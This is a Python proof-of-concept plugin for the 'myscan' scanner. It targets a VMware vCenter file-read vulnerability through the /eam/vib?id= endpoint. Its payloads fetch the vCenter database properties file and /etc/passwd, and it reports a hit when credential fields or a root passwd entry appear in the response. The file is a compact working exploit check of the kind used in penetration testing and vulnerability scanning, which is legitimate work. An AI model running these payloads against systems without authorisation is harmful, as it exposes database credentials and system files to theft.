# !/usr/bin/env python3
# @Time    : 2020/10/15
# @Author  : caicai
# @File    : poc_vmware_vcenter_readfile_2020.py

from myscan.lib.parse.response_parser import response_parser  ##写了一些操作resonse的方法的类
from myscan.lib.helper.request import request  # 修改了requests.request请求的库，建议使用此库，会在redis计数
from myscan.config import scan_set
import re


class POC():
    def __init__(self, workdata):
        self.dictdata = workdata.get("dictdata")  # python的dict数据，详情请看docs/开发指南Example dict数据示例
        self.url = workdata.get("data")  # self.url为需要测试的url，值为目录url，会以/结尾,如https://www.baidu.com/home/ ,为目录
        self.result = []  # 此result保存dict数据，dict需包含name,url,level,detail字段，detail字段值必须为dict。如下self.result.append代码
        self.name = "vmware_vcenter_readfile"
        self.vulmsg = "nodetail,google this payload"
        self.level = 2  # 0:Low  1:Medium 2:High

    def verify(self):
        # 根据config.py 配置的深度，限定一下目录深度
        if self.url.count("/") > int(scan_set.get("max_dir", 2)) + 2:
            return
        payloads = [r'/eam/vib?id=C:\ProgramData\VMware\vCenterServer\cfg\vmware-vpx\vcdb.properties',
                    r'/eam/vib?id=/etc/passwd']
        for payload in payloads:
            req = {
                "url": self.url + payload,
                "method": "GET",
                "headers": {
                    "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36"},
                "verify": False,
                "timeout": 10,
            }
            r = request(**req)
            if r is not None and (b"driver = " in r.content and b"dbtype = " in r.content) or (r is not None and
            re.search(b"root:[x\*]:0:0:", r.content)):
                parser_ = response_parser(r)
                self.result.append({
                    "name": self.name,
                    "url": self.url,
                    "level": self.level,  # 0:Low  1:Medium 2:High
                    "detail": {
                        "vulmsg": self.vulmsg,
                        "request": parser_.getrequestraw(),
                        "response": parser_.getresponseraw()
                    }
                })
                break
